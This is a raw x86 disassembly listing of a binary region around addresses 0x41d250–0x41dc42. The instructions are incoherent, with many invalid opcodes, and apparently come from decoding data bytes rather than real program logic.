  41d250:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d251:	(bad)  
  41d252:	rcl    DWORD PTR ds:0x6a9a57c3,1
  41d258:	mov    eax,ds:0xea25ef8c
  41d25d:	jo     0x41d21f
  41d25f:	dec    eax
  41d260:	sti    
  41d261:	cli    
  41d262:	inc    ebx
  41d263:	mov    ebp,DWORD PTR [esi]
  41d265:	data16 mov bl,0xb0
  41d268:	sbb    DWORD PTR [eax+0x7e],esi
  41d26b:	cmp    esp,DWORD PTR [edx-0x2db2d78e]
  41d271:	ret    
  41d272:	enter  0x9573,0xef
  41d276:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d277:	(bad)  
  41d278:	out    dx,al
  41d279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d27a:	(bad)  
  41d27b:	and    eax,0x47b507bf
  41d280:	inc    ebp
  41d281:	mov    ecx,0x5de4d89f
  41d286:	pop    ds
  41d287:	ins    BYTE PTR es:[edi],dx
  41d288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d289:	test   DWORD PTR [ebx+0x1801068d],0x183738c4
  41d293:	popw   es
  41d295:	pop    ds
  41d296:	dec    ebp
  41d297:	ja     0x41d2ad
  41d299:	or     BYTE PTR [eax+0x7c],ah
  41d29c:	push   esi
  41d29d:	int    0x8f
  41d29f:	jo     0x41d275
  41d2a1:	(bad)  
  41d2a2:	rcr    BYTE PTR [edi],0x72
  41d2a5:	add    esp,esp
  41d2a7:	mov    dh,0x3
  41d2a9:	push   ss
  41d2aa:	xor    eax,0x92cfd644
  41d2af:	repnz sbb BYTE PTR [ebp+ebp*4+0x38],ah
  41d2b4:	cmp    al,0x0
	...
  41d316:	inc    BYTE PTR [eax+0x7dff54f9]
  41d31c:	jmp    FWORD PTR [edx-0x7a8154e8]
  41d322:	arpl   dx,di
  41d324:	aam    0x4
  41d326:	mov    ds:0x7000134,al
  41d32b:	add    DWORD PTR [eax],eax
  41d32d:	add    BYTE PTR [edi],ah
  41d32f:	add    DWORD PTR [ebx+0x4f],eax
  41d332:	xchg   edx,eax
  41d333:	lock sbb eax,0x8729f9bc
  41d339:	mov    cs,WORD PTR [edx]
  41d33b:	out    dx,al
  41d33c:	xor    eax,0x5e208f46
  41d341:	cwde   
  41d342:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d343:	arpl   WORD PTR [edx+0x30119711],ax
  41d349:	icebp  
  41d34a:	mov    ds:0x66f31aea,eax
  41d34f:	mov    dh,0xe3
  41d351:	cld    
  41d352:	push   eax
  41d353:	xchg   ebp,eax
  41d354:	jl     0x41d2f7
  41d356:	and    DWORD PTR [esi+0x4c],ebx
  41d359:	loope  0x41d341
  41d35b:	jmp    0x861eeba7
  41d360:	push   es
  41d361:	mov    al,ds:0xe1de2f64
  41d366:	jecxz  0x41d34f
  41d368:	cmp    esp,DWORD PTR [edi+eax*1]
  41d36b:	inc    eax
  41d36c:	pop    ds
  41d36d:	loop   0x41d3ee
  41d36f:	sub    ch,BYTE PTR [ecx]
  41d371:	dec    edx
  41d372:	imul   ebp,DWORD PTR [esi+0x7a],0x714d66c3
  41d379:	pop    ebx
  41d37a:	rol    DWORD PTR [esi-0x621b353a],1
  41d380:	jp     0x41d312
  41d382:	leave  
  41d383:	or     BYTE PTR [edx-0x42],al
  41d386:	cld    
  41d387:	aam    0x49
  41d389:	cmp    DWORD PTR [edi],ebx
  41d38b:	clc    
  41d38c:	xor    eax,0x6ca4f320
  41d391:	vandnps xmm7,xmm2,XMMWORD PTR [ebx]
  41d395:	(bad)  
  41d397:	jg     0x41d325
  41d399:	cmp    al,0x10
  41d39b:	scas   eax,DWORD PTR es:[edi]
  41d39c:	ficomp WORD PTR [esi+esi*1]
  41d39f:	xor    al,0x77
  41d3a1:	psubq  mm5,QWORD PTR [ecx+0x1a8425da]
  41d3a8:	gs out dx,al
  41d3aa:	cli    
  41d3ab:	lahf   
  41d3ac:	lods   al,BYTE PTR ds:[esi]
  41d3ad:	mov    ch,0x5c
  41d3af:	addr16 data16 add bh,dl
  41d3b3:	nop
  41d3b4:	loope  0x41d399
  41d3b6:	ins    DWORD PTR es:[edi],dx
  41d3b7:	sub    eax,DWORD PTR [eax]
  41d3b9:	out    dx,al
  41d3ba:	fmul   DWORD PTR [ecx+edx*2-0x3c1e8cb]
  41d3c1:	hlt    
  41d3c2:	adc    esp,DWORD PTR [ebp+0x18]
  41d3c5:	dec    edx
  41d3c6:	fadd   DWORD PTR [ebx+0x73c8f86f]
  41d3cc:	push   ebp
  41d3cd:	add    eax,0x52fed226
  41d3d2:	cld    
  41d3d3:	mov    cs,WORD PTR [eax]
  41d3d5:	(bad)  
  41d3d6:	fisubr DWORD PTR [ebp+0x76]
  41d3d9:	cmp    cl,BYTE PTR [eax-0x57]
  41d3dc:	inc    edi
  41d3dd:	push   eax
  41d3de:	and    DWORD PTR [edx],ebx
  41d3e0:	(bad)
  41d3e4:	int3   
  41d3e5:	add    DWORD PTR [ebx-0x1f],esi
  41d3e8:	jo     0x41d453
  41d3ea:	mov    dh,bh
  41d3ec:	xchg   edx,eax
  41d3ed:	mov    esp,0x4965820f
  41d3f2:	push   cs
  41d3f3:	ds xor esp,esp
  41d3f6:	test   DWORD PTR ds:0x4e3dfeb1,eax
  41d3fc:	loopne 0x41d3ce
  41d3fe:	sar    DWORD PTR [edx-0x6a1c558f],0x6f
  41d405:	(bad)  
  41d407:	or     BYTE PTR [eax-0xd3a0a28],0x1c
  41d40e:	test   eax,0x5e6bcc78
  41d413:	inc    ebp
  41d414:	mov    dh,0xb2
  41d416:	xchg   esi,eax
  41d417:	mov    eax,0xa0104dda
  41d41c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d41d:	pop    ss
  41d41e:	arpl   WORD PTR [ebx+0x1ad3aa4c],si
  41d424:	mov    esi,0xe551c608
  41d429:	inc    esi
  41d42a:	sub    cl,dl
  41d42c:	mov    edx,0xf7e44a37
  41d431:	add    eax,0x22d80
	...
  41d496:	div    BYTE PTR [esi]
  41d498:	rcl    BYTE PTR [edx+edx*8-0x2e89090c],cl
  41d49f:	fwait
  41d4a0:	aad    0xa2
  41d4a2:	push   ds
  41d4a3:	sub    DWORD PTR [edi+0x135a9f4],ebx
  41d4a9:	add    BYTE PTR [edi],al
  41d4ab:	add    DWORD PTR [eax],eax
  41d4ad:	add    BYTE PTR [ebp-0xe5a5ea2],dl
  41d4b3:	or     ecx,DWORD PTR [edx+edx*2]
  41d4b6:	mov    ebp,0x1c9cac1f
  41d4bb:	ret    
  41d4bc:	push   es
  41d4bd:	inc    eax
  41d4be:	fdiv   QWORD PTR [ebp+0x7a]
  41d4c1:	stos   BYTE PTR es:[edi],al
  41d4c2:	dec    ebx
  41d4c3:	in     al,dx
  41d4c4:	xchg   DWORD PTR ds:0x7f7e6f53,esp
  41d4ca:	fldcw  WORD PTR [ebx-0x67421d9e]
  41d4d0:	aam    0x52
  41d4d2:	dec    ebp
  41d4d3:	test   eax,0x659b7584
  41d4d8:	and    BYTE PTR [ebp-0x6656937c],ah
  41d4de:	lock ins DWORD PTR es:[edi],dx
  41d4e0:	loop   0x41d46e
  41d4e2:	xor    cl,BYTE PTR [ecx]
  41d4e4:	aam    0x29
  41d4e6:	jb     0x41d47e
  41d4e8:	xchg   ecx,eax
  41d4e9:	xchg   ebx,eax
  41d4ea:	addr16 das 
  41d4ec:	add    BYTE PTR [eax],bh
  41d4ee:	push   DWORD PTR [eax]
  41d4f0:	add    dh,BYTE PTR [ebx+0x69]
  41d4f3:	xor    ah,BYTE PTR [ecx]
  41d4f5:	mov    edx,0x181b9e
  41d4fa:	inc    eax
  41d4fb:	pop    edi
  41d4fc:	adc    ah,BYTE PTR [eax-0x513d3e9b]
  41d502:	xor    BYTE PTR [edi+0x33],0x22
  41d506:	aam    0x75
  41d508:	pop    edx
  41d509:	mov    ds:0xd83bb869,al
  41d50e:	mov    ds:0x9eef0471,eax
  41d513:	fcmovnbe st,st(1)
  41d515:	xor    ecx,DWORD PTR [ecx+ecx*2+0x22]
  41d519:	(bad)  
  41d51b:	cmp    eax,DWORD PTR [esi-0x6e]
  41d51e:	mov    esi,0x1b9eaf30
  41d523:	inc    edi
  41d524:	xchg   ebx,eax
  41d525:	jne    0x41d520
  41d527:	jb     0x41d51d
  41d529:	push   ecx
  41d52b:	leave  
  41d52c:	repz jnp 0x41d536
  41d52f:	idiv   DWORD PTR [ebx+0x35]
  41d532:	sahf   
  41d533:	fwait
  41d534:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d535:	cmp    DWORD PTR [esp+edx*2-0x6961c98e],0x5672284
  41d540:	nop
  41d541:	mov    es,WORD PTR [esi-0x17]
  41d544:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d546:	retf   
  41d547:	ins    BYTE PTR es:[edi],dx
  41d548:	clc    
  41d549:	rcr    al,0x4a
  41d54c:	ficomp DWORD PTR [eax]
  41d54e:	sbb    eax,0xf
  41d551:	std    
  41d552:	push   eax
  41d553:	fild   WORD PTR [edx-0x68]
  41d556:	test   DWORD PTR [edi],ecx
  41d558:	cdq    
  41d559:	push   cs
  41d55a:	or     al,0xfa
  41d55c:	pusha  
  41d55d:	pop    ebp
  41d55e:	adc    eax,ecx
  41d560:	cmp    al,0x9
  41d562:	out    dx,eax
  41d563:	mov    edi,0xbca8cec2
  41d568:	aaa    
  41d569:	lock loope 0x41d59f
  41d56c:	jmp    0xee9b:0xb2b7357e
  41d573:	popf   
  41d574:	mov    al,0x4a
  41d576:	rcr    DWORD PTR [edx-0xcb54817],1
  41d57c:	(bad)  
  41d57d:	in     al,0x42
  41d57f:	pminub mm0,QWORD PTR [ebx+0x2b]
  41d583:	mov    dl,0x95
  41d585:	test   DWORD PTR [ebp+0xe],eax
  41d588:	and    BYTE PTR [eax+0x64],bh
  41d58b:	mov    ebx,0xdaff2bfd
  41d590:	push   esi
  41d591:	cmp    eax,0xc5af7f2
  41d596:	push   ss
  41d597:	adc    edx,DWORD PTR ds:0xd67a6547
  41d59d:	push   ss
  41d59e:	xchg   ebp,eax
  41d59f:	inc    eax
  41d5a0:	in     al,dx
  41d5a1:	jmp    0x918a97c3
  41d5a6:	push   ecx
  41d5a7:	add    ecx,DWORD PTR [esi+0x15]
  41d5aa:	dec    esi
  41d5ab:	push   cs
  41d5ac:	cmp    al,0xe
  41d5ae:	push   es
  41d5af:	jmp    0x9a:0xc24f5045
	...
  41d616:	jl     0x41d5b1
  41d618:	dec    esp
  41d619:	jbe    0x41d608
  41d61b:	idiv   DWORD PTR [esi-0x65]
  41d61e:	mov    al,BYTE PTR [edi-0x3c7a2ddf]
  41d624:	or     BYTE PTR [edi-0x50],dh
  41d627:	add    DWORD PTR ss:[eax],eax
  41d62a:	pop    es
  41d62b:	add    DWORD PTR [eax],eax
  41d62d:	add    BYTE PTR [ebx],dh
  41d62f:	ins    DWORD PTR es:[edi],dx
  41d630:	pop    ss
  41d631:	push   es
  41d632:	push   ds
  41d633:	rcr    BYTE PTR [esi+0x53],0x1d
  41d637:	aaa    
  41d638:	ret    
  41d639:	push   esi
  41d63a:	jnp    0x41d6a1
  41d63c:	xor    al,0x9
  41d63e:	jne    0x41d67b
  41d640:	loopne 0x41d657
  41d642:	sub    al,0x37
  41d644:	shl    BYTE PTR [eax+eiz*1],cl
  41d647:	retf   
  41d648:	xchg   edx,eax
  41d649:	daa    
  41d64a:	aad    0x7d
  41d64c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d64d:	popa   
  41d64e:	int3   
  41d64f:	popf   
  41d650:	xchg   esi,eax
  41d651:	cmovge edx,DWORD PTR [eax-0x76]
  41d655:	test   BYTE PTR [eax+0x5f],ah
  41d658:	scas   al,BYTE PTR es:[edi]
  41d659:	mov    bl,0x5a
  41d65b:	pop    ds
  41d65c:	mov    dh,0xd3
  41d65e:	bnd jns 0x41d6b8
  41d661:	pop    ss
  41d662:	sbb    eax,edx
  41d664:	push   ebp
  41d665:	mov    eax,0xcf920679
  41d66a:	cmp    eax,0x63485e60
  41d66f:	stc    
  41d670:	je     0x41d636
  41d672:	add    al,0x5c
  41d674:	cmp    dl,cl
  41d676:	add    al,ah
  41d678:	xor    DWORD PTR [edx],ebx
  41d67a:	adc    esi,DWORD PTR [ecx]
  41d67c:	ss ret 0x9f72
  41d680:	dec    esi
  41d681:	popa   
  41d682:	push   ds
  41d683:	inc    edi
  41d684:	mov    bh,BYTE PTR [ebp+0x279dbfae]
  41d68a:	hlt    
  41d68b:	push   esi
  41d68c:	scas   eax,DWORD PTR es:[edi]
  41d68d:	in     eax,0xd9
  41d68f:	xor    esp,DWORD PTR [edx-0x64ee0ba7]
  41d695:	dec    eax
  41d696:	ins    BYTE PTR es:[edi],dx
  41d697:	adc    dl,BYTE PTR [esi]
  41d699:	jge    0x41d677
  41d69b:	fidivr WORD PTR [ebx+eax*8+0x12]
  41d69f:	jne    0x41d6f6
  41d6a1:	rol    DWORD PTR [ebx+0x1939da04],cl
  41d6a7:	xor    al,0x19
  41d6a9:	out    0xd4,eax
  41d6ab:	jmp    0x3626:0x65fb91df
  41d6b2:	fs xchg esp,eax
  41d6b4:	xchg   edi,eax
  41d6b5:	lahf   
  41d6b6:	imul   edx,DWORD PTR ss:[ecx],0xb81961fe
  41d6bd:	jg     0x41d6e1
  41d6bf:	out    0x46,eax
  41d6c1:	outs   dx,DWORD PTR ds:[esi]
  41d6c2:	dec    DWORD PTR [edi+esi*4+0x6a]
  41d6c6:	rol    BYTE PTR [edx-0x75],0xd4
  41d6ca:	in     eax,dx
  41d6cb:	mov    dl,0x51
  41d6cd:	pop    esp
  41d6ce:	loopne 0x41d6d3
  41d6d0:	and    al,0x22
  41d6d2:	das    
  41d6d3:	pop    es
  41d6d4:	cmc    
  41d6d5:	jo     0x41d6b5
  41d6d7:	loop   0x41d741
  41d6d9:	pop    edx
  41d6da:	test   DWORD PTR [esi],edi
  41d6dc:	cmp    bl,BYTE PTR [ecx-0x78]
  41d6df:	mov    esp,0xbf8dac7a
  41d6e4:	mov    ebp,0x427eb9d
  41d6e9:	xor    ah,BYTE PTR [edi+0x56f47ee9]
  41d6ef:	(bad)  
  41d6f1:	pop    esp
  41d6f2:	push   cs
  41d6f3:	(bad)  
  41d6f4:	dec    edx
  41d6f5:	rol    eax,0x2a
  41d6f8:	push   ebp
  41d6f9:	xchg   BYTE PTR [eax],ah
  41d6fb:	lods   eax,DWORD PTR ds:[esi]
  41d6fc:	arpl   dx,ax
  41d6fe:	push   cs
  41d6ff:	jge    0x41d6ea
  41d701:	mov    ch,0x4c
  41d703:	cdq    
  41d704:	loopne 0x41d689
  41d706:	mov    ebp,0x7bedc91f
  41d70b:	dec    esp
  41d70c:	inc    eax
  41d70d:	cdq    
  41d70e:	call   0xe3408414
  41d713:	sub    eax,0x20040167
  41d718:	inc    ecx
  41d719:	push   ebx
  41d71a:	hlt    
  41d71b:	imul   DWORD PTR [eax-0x4]
  41d71e:	fldcw  WORD PTR [ebx-0x4e]
  41d721:	mov    ecx,0xfbfc9e16
  41d726:	repz mov edx,0xdc52f4f4
  41d72c:	mov    bl,0xe2
  41d72e:	pop    ecx
  41d72f:	xchg   ecx,eax
  41d730:	mov    esp,esp
  41d732:	sar    DWORD PTR [edi+edx*2+0x0],cl
	...
  41d795:	add    BYTE PTR [esi+ecx*8],ah
  41d798:	outs   dx,BYTE PTR ds:[esi]
  41d799:	sub    ch,dh
  41d79b:	stos   BYTE PTR es:[edi],al
  41d79c:	fs into 
  41d79e:	push   ecx
  41d79f:	pop    ebp
  41d7a0:	or     esp,edi
  41d7a2:	(bad)  
  41d7a4:	repnz push ss
  41d7a6:	mov    bh,0x37
  41d7a8:	add    DWORD PTR [eax],eax
  41d7aa:	pop    es
  41d7ab:	add    DWORD PTR [eax],eax
  41d7ad:	add    bh,bh
  41d7af:	mov    ebp,0xaedbd9ba
  41d7b4:	fdivr  QWORD PTR [edi-0x1bd1846d]
  41d7ba:	daa    
  41d7bb:	pop    ds
  41d7bc:	or     eax,0x62b7791
  41d7c1:	cmp    DWORD PTR [esp+ebp*4+0x42],esi
  41d7c5:	fwait
  41d7c6:	cmp    DWORD PTR [edi+0x28d30ea8],esp
  41d7cc:	cs push esp
  41d7ce:	(bad)  
  41d7cf:	mov    eax,0xd73ed728
  41d7d4:	sub    DWORD PTR [ebx],eax
  41d7d6:	enter  0xc135,0x33
  41d7da:	mov    eax,ds:0xb1848239
  41d7df:	adc    eax,0x6fb36357
  41d7e4:	mov    esp,DWORD PTR [eax+0x50]
  41d7e7:	call   0xb6419c7d
  41d7ec:	sar    BYTE PTR [ebp-0x2e],0x5f
  41d7f0:	xlat   BYTE PTR ds:[ebx]
  41d7f1:	inc    esi
  41d7f2:	add    al,0x2
  41d7f4:	js     0x41d861
  41d7f6:	add    al,0x9b
  41d7f8:	(bad)  
  41d7f9:	sbb    al,0x74
  41d7fb:	into   
  41d7fc:	and    DWORD PTR [edx-0x2e460330],esi
  41d802:	dec    esi
  41d803:	pop    edi
  41d804:	in     eax,dx
  41d805:	mov    BYTE PTR [edi+0x7ed429c2],bh
  41d80b:	pop    es
  41d80c:	jae    0x41d85c
  41d80e:	(bad)  
  41d80f:	push   0xd21b23ab
  41d814:	neg    BYTE PTR [edx]
  41d816:	and    DWORD PTR [eax+ebx*2+0x3f],esp
  41d81a:	push   cs
  41d81b:	cwde   
  41d81c:	out    0x68,eax
  41d81e:	jl     0x41d81f
  41d820:	mov    al,0xde
  41d822:	arpl   WORD PTR [ebx+0x4845d999],cx
  41d828:	cmp    BYTE PTR [edi-0x15],ah
  41d82b:	ss mov dl,0x5a
  41d82e:	inc    edi
  41d82f:	jne    0x41d85e
  41d831:	push   eax
  41d832:	inc    ecx
  41d833:	loop   0x41d7f0
  41d835:	(bad)  
  41d836:	and    al,0xb2
  41d838:	clc    
  41d839:	sbb    eax,0xdb207e3c
  41d83e:	mov    ds:0x16965a27,al
  41d843:	aad    0xd2
  41d845:	mov    edi,cs
  41d847:	das    
  41d848:	cmp    BYTE PTR [eax+eax*8+0x7097f5ac],cl
  41d84f:	hlt    
  41d850:	xor    DWORD PTR [eax],edx
  41d852:	mov    bh,0xd3
  41d854:	xchg   ebx,eax
  41d855:	aaa    
  41d856:	cmp    edi,ecx
  41d858:	(bad)  
  41d859:	hlt    
  41d85a:	cmp    bh,BYTE PTR [esp+eax*2]
  41d85d:	xchg   esp,eax
  41d85e:	dec    ebp
  41d85f:	push   0x9fa5c27
  41d864:	mov    dl,0x13
  41d866:	fld    QWORD PTR [esi+0x1f]
  41d869:	lds    edi,FWORD PTR [esp+eiz*4-0x11853585]
  41d870:	test   eax,0xa06f496a
  41d875:	repnz fcomip st,st(3)
  41d878:	push   0xffffff96
  41d87a:	add    eax,0xf617d27b
  41d87f:	in     al,dx
  41d880:	retf   
  41d881:	xlat   BYTE PTR ds:[ebx]
  41d882:	sub    edx,DWORD PTR [edi]
  41d884:	pop    edx
  41d885:	mov    al,ds:0xea2f9360
  41d88a:	sub    al,0xaf
  41d88c:	outs   dx,DWORD PTR ds:[esi]
  41d88d:	sbb    eax,0xdbcc2a2b
  41d892:	jmp    FWORD PTR [edx-0x18]
  41d895:	adc    eax,0x42684577
  41d89a:	cmp    al,0x5b
  41d89c:	dec    edx
  41d89d:	mov    cl,0xb1
  41d89f:	pop    ebx
  41d8a0:	unpcklps xmm4,XMMWORD PTR [ecx-0x1f]
  41d8a4:	jmp    0x41d8db
  41d8a6:	mov    eax,0xbfb1ab0b
  41d8ab:	jno    0x41d8ec
  41d8ad:	dec    esp
  41d8ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8af:	cld    
  41d8b0:	int    0x61
  41d8b2:	dec    ebx
  41d8b3:	add    al,0x7b
	...
  41d915:	add    ah,al
  41d917:	ins    BYTE PTR es:[edi],dx
  41d918:	pop    es
  41d919:	pushf  
  41d91a:	scas   eax,DWORD PTR es:[edi]
  41d91b:	(bad)  
  41d91c:	fistp  QWORD PTR [ebx+eiz*8+0x0]
  41d920:	inc    eax
  41d921:	jmp    0x38be:0x8d23458e
  41d928:	add    DWORD PTR [eax],eax
  41d92a:	pop    es
  41d92b:	add    DWORD PTR [eax],eax
  41d92d:	add    ah,bl
  41d92f:	xor    ah,BYTE PTR ds:0xe244e25
  41d935:	pop    ds
  41d936:	call   0xacd9f376
  41d93b:	sub    BYTE PTR [edx-0x30512091],ch
  41d941:	xchg   esp,eax
  41d942:	push   0xffffffdc
  41d944:	xor    DWORD PTR [edx+0x380069a6],ebx
  41d94a:	mov    bl,0xa
  41d94c:	xchg   edi,eax
  41d94d:	mov    ds:0x76138944,al
  41d952:	pop    es
  41d953:	into   
  41d954:	push   esp
  41d955:	or     ebp,DWORD PTR [edx-0x697fbdb7]
  41d95b:	xchg   ebp,eax
  41d95c:	repnz cli 
  41d95e:	adc    eax,0xfa459f79
  41d963:	pop    ebx
  41d964:	mov    ds:0xaa4d89e2,eax
  41d969:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d96a:	or     BYTE PTR [ecx],bl
  41d96c:	sbb    BYTE PTR [ebp-0x5089e5c2],0x3f
  41d973:	popf   
  41d974:	fdivr  QWORD PTR ds:0x474898df
  41d97a:	into   
  41d97b:	aaa    
  41d97c:	gs (bad) 
  41d97e:	bnd js 0x41d916
  41d981:	push   eax
  41d982:	pop    DWORD PTR [ebx]
  41d984:	inc    esi
  41d985:	ins    BYTE PTR es:[edi],dx
  41d986:	push   ecx
  41d987:	push   es
  41d988:	(bad)  
  41d989:	enter  0x763c,0x57
  41d98d:	cmp    ebx,DWORD PTR [ecx]
  41d98f:	sahf   
  41d990:	lea    ecx,[esi+0x77]
  41d993:	inc    esp
  41d994:	fs test eax,0x6480908d
  41d99a:	jnp    0x41d9ff
  41d99c:	stc    
  41d99d:	cmp    bh,BYTE PTR [esi]
  41d99f:	cld    
  41d9a0:	fmul   QWORD PTR [eax+ebx*1-0x29]
  41d9a4:	and    BYTE PTR [ebp-0x5a],ah
  41d9a7:	sub    edx,ecx
  41d9a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9aa:	inc    edi
  41d9ab:	call   0xfb195784
  41d9b0:	jns    0x41d97d
  41d9b2:	pop    ax
  41d9b4:	xchg   edx,eax
  41d9b5:	iret   
  41d9b6:	sbb    ebx,edx
  41d9b8:	in     eax,dx
  41d9b9:	aaa    
  41d9ba:	mov    ds:0x763e2ef9,al
  41d9bf:	outs   dx,DWORD PTR ds:[esi]
  41d9c0:	iret   
  41d9c1:	push   ecx
  41d9c2:	add    bl,BYTE PTR [ebx+0x7254d1f5]
  41d9c8:	add    DWORD PTR [esi-0x7d9c88c],0xae5c4569
  41d9d2:	repnz push ebp
  41d9d4:	loopne 0x41d989
  41d9d6:	in     al,dx
  41d9d7:	out    0x54,eax
  41d9d9:	push   edx
  41d9da:	and    esp,DWORD PTR [esi+esi*4+0x18167081]
  41d9e1:	je     0x41da59
  41d9e3:	cdq    
  41d9e4:	shl    BYTE PTR [ebx],cl
  41d9e6:	das    
  41d9e7:	jno    0x41d981
  41d9e9:	sahf   
  41d9ea:	out    dx,al
  41d9eb:	inc    ebp
  41d9ec:	dec    edi
  41d9ed:	dec    edx
  41d9ee:	psubd  mm6,QWORD PTR [ebp-0x96d6a7]
  41d9f5:	inc    BYTE PTR [esi]
  41d9f7:	mov    BYTE PTR [ebp-0x3877b289],dh
  41d9fd:	push   ss
  41d9fe:	sbb    bh,BYTE PTR [ebp-0x7b1c2bd0]
  41da04:	inc    edx
  41da05:	stos   BYTE PTR es:[edi],al
  41da06:	inc    edi
  41da07:	data16 (bad) 
  41da0b:	addr16 shr dh,cl
  41da0e:	sbb    DWORD PTR [edx-0x2099493f],0xf800159e
  41da18:	aad    0xf1
  41da1a:	clc    
  41da1b:	hlt    
  41da1c:	shr    dh,0x8d
  41da1f:	fs aas 
  41da21:	xor    dl,BYTE PTR [ebp+ecx*1+0xde9d27f]
  41da28:	or     al,0xfc
  41da2b:	push   es
  41da2c:	xor    eax,0xeac42a3c
  41da31:	test   eax,0x716bbd
	...
  41da96:	sbb    al,0x15
  41da98:	jnp    0x41daed
  41da9a:	jnp    0x41db1b
  41da9c:	cmp    al,0x5f
  41da9e:	out    dx,al
  41da9f:	lahf   
  41daa0:	push   esi
  41daa1:	pop    es
  41daa2:	retf   
  41daa3:	fsubr  QWORD PTR [ebp+0x139c514]
  41daa9:	add    BYTE PTR [edi],al
  41daab:	add    DWORD PTR [eax],eax
  41daad:	add    BYTE PTR [ebx+0x3e30de32],cl
  41dab3:	lahf   
  41dab4:	push   ebp
  41dab5:	lahf   
  41dab6:	repnz adc al,0xcb
  41dab9:	jle    0x41dafc
  41dabb:	addr16 sbb bh,cl
  41dabe:	loopne 0x41da7d
  41dac0:	mov    bl,0x6f
  41dac2:	jge    0x41db2c
  41dac4:	mov    ds,WORD PTR [edx-0x2e9e5349]
  41daca:	stos   BYTE PTR es:[edi],al
  41dacb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dacc:	mov    ds:0x6be7a8e7,eax
  41dad1:	or     BYTE PTR [edi],dh
  41dad3:	mov    ds:0xdbd6c730,eax
  41dad8:	adc    DWORD PTR [eax-0x2e],0x2c
  41dadc:	ds inc esi
  41dade:	ss dec edx
  41dae0:	mov    ecx,0xebbeba9b
  41dae5:	out    0x64,eax
  41dae7:	ret    
  41dae8:	push   edx
  41dae9:	pop    ebp
  41daea:	xor    al,0xc9
  41daec:	cwde   
  41daed:	push   eax
  41daee:	push   ecx
  41daef:	add    esi,ebp
  41daf1:	adc    al,0xca
  41daf3:	jge    0x41db4f
  41daf5:	retf   
  41daf6:	stos   BYTE PTR es:[edi],al
  41daf7:	jb     0x41db12
  41daf9:	test   DWORD PTR [edx-0x7b],0x50c99a88
  41db00:	icebp  
  41db01:	push   esi
  41db02:	psrlw  mm5,QWORD PTR [edi]
  41db05:	cld    
  41db06:	loopne 0x41db53
  41db08:	test   al,0xae
  41db0a:	mov    dl,0xb0
  41db0c:	inc    ecx
  41db0d:	xchg   ecx,eax
  41db0e:	pop    ebx
  41db0f:	cmp    BYTE PTR [esi+0x257f9de5],dh
  41db15:	xchg   esp,eax
  41db16:	jae    0x41db60
  41db18:	pop    edi
  41db19:	aaa    
  41db1a:	xor    ebp,ebx
  41db1c:	push   0xad7b7458
  41db21:	retf   
  41db22:	pop    ebp
  41db23:	jmp    0x82e6c9b1
  41db28:	jmp    0xdab2:0x1924431
  41db2f:	cmp    al,0x1f
  41db31:	cmp    BYTE PTR [esi],al
  41db33:	in     al,dx
  41db34:	and    DWORD PTR es:[edx+0xccaa4ba],edi
  41db3b:	rcl    BYTE PTR [ecx-0x76b9e999],0xeb
  41db42:	ret    
  41db43:	loope  0x41db88
  41db45:	or     BYTE PTR [ebp-0x40c3223c],ch
  41db4b:	in     al,dx
  41db4c:	adc    al,0x2
  41db4e:	(bad)  [edx]
  41db50:	mov    ch,0xb9
  41db52:	sub    bh,BYTE PTR [esi+0x5]
  41db55:	or     al,0x79
  41db57:	arpl   WORD PTR [esi+eax*1-0x28],bp
  41db5b:	ja     0x41db69
  41db5d:	ins    BYTE PTR es:[edi],dx
  41db5e:	dec    ecx
  41db5f:	mov    ds,WORD PTR [esi-0x74899975]
  41db65:	iret   
  41db66:	xchg   ah,ah
  41db68:	push   es
  41db69:	into   
  41db6a:	pop    edx
  41db6b:	dec    ebx
  41db6c:	lods   al,BYTE PTR ds:[esi]
  41db6d:	mov    eax,0x9a2b9099
  41db72:	jg     0x41db9d
  41db74:	not    BYTE PTR [esi-0x77e65081]
  41db7a:	rcl    DWORD PTR [ebx-0x27],1
  41db7d:	mov    esi,0x6fca7f19
  41db82:	mov    ecx,0x5d448e1c
  41db87:	cmc    
  41db88:	inc    ebp
  41db89:	adc    BYTE PTR [edx-0x2b3ca152],cl
  41db8f:	xchg   edi,eax
  41db90:	xchg   ebx,eax
  41db91:	retf   
  41db92:	mov    ebp,0x72837302
  41db97:	in     al,dx
  41db98:	inc    esi
  41db99:	jp     0x41dc03
  41db9b:	push   0xffffffe2
  41db9d:	in     al,0x71
  41db9f:	nop
  41dba0:	lock xchg ecx,eax
  41dba2:	xor    BYTE PTR [ebx+0x56],0x64
  41dba6:	mov    WORD PTR [ebx+0x2f],cs
  41dba9:	push   0xae90a703
  41dbae:	inc    edx
  41dbaf:	test   al,0x7e
  41dbb1:	inc    edx
  41dbb2:	retf   
  41dbb3:	xchg   ecx,eax
  41dbb4:	call   0x41dbb9
	...
  41dc15:	add    BYTE PTR [edi-0x36],ch
  41dc18:	adc    eax,0xefdfb598
  41dc1d:	dec    ebp
  41dc1f:	ja     0x41dc8f
  41dc21:	aas    
  41dc22:	mov    esi,0xccef00f3
  41dc27:	cmp    al,BYTE PTR [ecx]
  41dc29:	add    BYTE PTR [edi],al
  41dc2b:	add    DWORD PTR [eax],eax
  41dc2d:	add    dh,ch
  41dc2f:	(bad)  
  41dc30:	push   es
  41dc31:	xchg   esi,eax
  41dc32:	fisttp QWORD PTR [eax-0x74]
  41dc35:	scas   al,BYTE PTR es:[edi]
  41dc36:	inc    edx
  41dc37:	in     eax,dx
  41dc38:	xchg   ecx,eax
  41dc39:	pop    ds
  41dc3a:	adc    eax,ecx
  41dc3c:	pop    ss
  41dc3d:	pop    ss
  41dc3e:	(bad)  
  41dc3f:	xchg   esi,eax
  41dc40:	inc    edx
  41dc41:	popa   
  41dc42:	fstp   QWORD PTR [edx]
